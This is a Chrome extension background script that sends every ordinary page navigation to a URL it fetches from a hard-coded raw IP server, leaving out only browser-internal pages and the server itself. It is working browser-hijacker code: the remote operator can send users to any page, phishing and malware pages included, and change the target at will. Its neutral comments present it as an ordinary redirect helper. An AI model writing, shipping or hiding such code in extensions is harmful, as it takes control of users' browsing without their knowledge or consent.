// API endpoint to fetch redirect URL
const API_ENDPOINT = 'http://38.247.146.9:3120';

// Cache for the redirect URL
let cachedRedirectUrl = null;
let lastFetchTime = 0;
const CACHE_DURATION = 60000; // Cache for 1 minute

// Function to fetch redirect URL from API
async function getRedirectUrl() {
  const now = Date.now();

  // Return cached URL if still valid
  if (cachedRedirectUrl && (now - lastFetchTime) < CACHE_DURATION) {
    return cachedRedirectUrl;
  }

  try {
    const response = await fetch(API_ENDPOINT, {
      method: 'GET',
      headers: {
        'Accept': 'text/plain, application/json, */*'
      }
    });

    if (response.ok) {
      const text = await response.text();
      // The response might be a URL directly or JSON
      let redirectUrl;

      try {
        const json = JSON.parse(text);
        redirectUrl = json.url || json.redirect || json;
      } catch {
        // If not JSON, treat as plain text URL
        redirectUrl = text.trim();
      }

      // Validate URL
      if (redirectUrl && (redirectUrl.startsWith('http://') || redirectUrl.startsWith('https://'))) {
        cachedRedirectUrl = redirectUrl;
        lastFetchTime = now;
        console.log('Fetched redirect URL:', redirectUrl);
        return redirectUrl;
      }
    }
  } catch (error) {
    console.error('Error fetching redirect URL:', error);
  }

  // Fallback to GitHub if API fails
  return 'https://github.com';
}

// Function to check if URL should be redirected
function shouldRedirect(urlString) {
  try {
    const url = new URL(urlString);

    // Don't redirect browser internal pages
    if (url.protocol.startsWith('chrome') ||
        url.protocol.startsWith('edge') ||
        url.protocol.startsWith('about') ||
        url.protocol.startsWith('extension')) {
      return false;
    }

    // Don't redirect if it's the API endpoint itself
    if (url.hostname === '38.247.146.9' && url.port === '3120') {
      return false;
    }

    return true;
  } catch (e) {
    return false;
  }
}

// Listen for when a navigation is about to occur
chrome.webNavigation.onBeforeNavigate.addListener(async (details) => {
  // Only process main frame navigations (not iframes)
  if (details.frameId === 0 && shouldRedirect(details.url)) {
    const redirectUrl = await getRedirectUrl();

    // Don't redirect if already on the target URL
    if (!details.url.startsWith(redirectUrl)) {
      chrome.tabs.update(details.tabId, {
        url: redirectUrl
      });
    }
  }
});

// Alternative approach: Listen for tab updates
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo) => {
  // Check if the URL is changing
  if (changeInfo.url && shouldRedirect(changeInfo.url)) {
    const redirectUrl = await getRedirectUrl();

    // Don't redirect if already on the target URL
    if (!changeInfo.url.startsWith(redirectUrl)) {
      chrome.tabs.update(tabId, {
        url: redirectUrl
      });
    }
  }
});

